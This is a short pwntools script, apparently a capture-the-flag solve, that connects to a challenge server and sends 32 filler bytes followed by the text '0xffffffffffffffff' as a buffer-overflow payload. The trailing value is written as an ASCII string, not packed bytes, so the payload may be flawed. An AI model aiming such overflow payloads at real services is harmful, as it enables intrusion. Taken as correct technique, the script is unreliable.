from pwn import *

r = remote('mc.ax', 31199)

padding = b'A' * 32 + b'0xffffffffffffffff'

r.sendline(padding)